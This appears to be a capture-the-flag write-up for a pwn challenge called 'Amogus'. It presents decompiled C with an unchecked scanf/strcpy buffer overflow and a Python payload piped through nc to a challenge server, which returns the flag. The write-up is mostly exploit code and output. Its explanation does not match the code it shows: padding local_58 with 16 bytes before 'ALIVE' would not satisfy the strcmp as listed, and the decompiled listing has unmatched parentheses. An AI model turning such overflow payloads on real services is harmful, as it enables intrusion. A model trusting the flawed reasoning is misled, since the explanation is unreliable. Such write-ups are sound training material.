1. Analyse the file with Ghidra. main() shows this:
```int main(void) {
        long in_FS_OFFSET;
        char local_28[24];
        long local_10;

        local_10 = *(long *)(in_FS_OFFSET + 0x28);

        puts("Welcome to Amogus.\n");
        display();
        puts("Enter your name:\n");

        __isoc99_scanf("%s", local_28);
        gameplay(local_28);

        if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                __stack_chk_fail();  // Stack canary check
        }

        return 0;
}```

gameplay() shows this:
```void gameplay(char *param_1) {
        int iVar1;
        FILE *_stream;
        long in_FS_OFFSET;
        char local_68[16];
        char local_58[16];
        char local_48[64];
        long local_10;

        local_10 = *(long *)(in_FS_OFFSET + 0x28);

        __builtin_strncpy(local_68, "DEAD", 5);
        strcpy(local_58, param_1);
        iVar1 = strcmp(local_58, "ALIVE");

        if (iVar1 == 0) {
                _stream = fopen("flag.txt", "r");

                if (_stream == NULL) {
                printf("Error in opening the flag file. Flag file might be missing :(\n"));
                } else {
                fgets(local_48, 0x2d, _stream);
                puts("How are you still alive?!\n");
                puts(local_48);
                }
        } else {
                iVar1 = strcmp(local_58, "DEAD");

                if (iVar1 != 0) {
                puts("ERROR. ERROR. AMONG US NOT RESPONDING.");
                exit(0);
        }

        puts("You are a crewmate. \n");
        FUN_00401160(1);
        puts("You go to Medbay to finish your tasks.\n");
        FUN_00401160(1);
        puts("Suddenly, you hear a gunshot... The world goes dark. \n");
        FUN_00401160(1);
        puts("GAME OVER. YOU LOST :("));
    }

    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }

    return;
}```

2. From gameplay(), the condition for printing flag.txt is ```iVar1 == 0```.
Since ```iVar1 = strcmp(local_58, "ALIVE") == 0```, our payload needs to include "ALIVE", and since local_58 is a 16-byte buffer, we need to include more characters aside from "ALIVE" to fill it up.

3. Use 16 bytes of "A" to fill up local_58, and include "ALIVE":

```└─$ python -c 'print("A"*16 + "ALIVE\x00")' | nc 43.205.113.100 8292
    Welcome to Amogus.

    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣀⣤⣤⣤⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀  
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣼⠟⠉⠉⠉⠉⠉⠉⠉⠙⠻⢶⣄⠀⠀⠀⠀   
            ⣾⡏⠀⠀⠀⠀⠀⠀     ⠙⣷⡀⠀    
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣸⡟⠀⣠⣶⠛⠛⠛⠛⠛⠛⠳⣦⡀⠀⠘⣿⡄    
    ⠀⠀⠀⠀⠀⠀⠀⠀ ⢠⣿⠁⠀⢹⣿⣦⣀⣀⣀⣀⣀⣠⣼⡇⠀⠀⠸⣷⠀⠀  
    ⠀⠀⠀⠀⠀⠀⠀⠀ ⣼⡏⠀⠀⠀⠉⠛⠿⠿⠿⠿⠛⠋⠁⠀⠀⠀⠀⣿    
            ⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀  ⢻⡇⠀  
            ⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⢸⡇   
    ⠀⠀⠀⠀⠀⠀⠀ ⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀  
    ⠀⠀⠀⠀⠀⠀⠀ ⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀  
    ⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀  
    ⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⣿⠀  
    ⠀⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⣠⡶⠶⠿⠿⠿⠿⢷⣦⠀⠀⠀⠀⠀  ⣿⠀  
    ⠀⠀⣀⣀⣀⠀⣸⡇⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀ ⣿⠀ 
    ⣠⡿⠛⠛⠛⠛⠻⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀ ⠀⣿⠀ 
    ⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡟⠀⠀⢀⣤⣤⣴⣿⠀⠀⠀⠀⠀⠀  ⣿⠀ 
    ⠈⠙⢷⣶⣦⣤⣤⣤⣴⣶⣾⠿⠛⠁⢀⣶⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀  
                ⣿⣆⡀⠀⠀⠀⠀⠀⢀⣠⣴⡾⠃    
                ⠀⠀⠈⠛⠻⢿⣿⣾⣿⡿⠿⠟⠋⠁⠀⠀   
    Enter your name:

    How are you still alive?!

    shaktictf{ch@ng3d_fat3_wh3n_I_s@w_r3d_v3nt_}```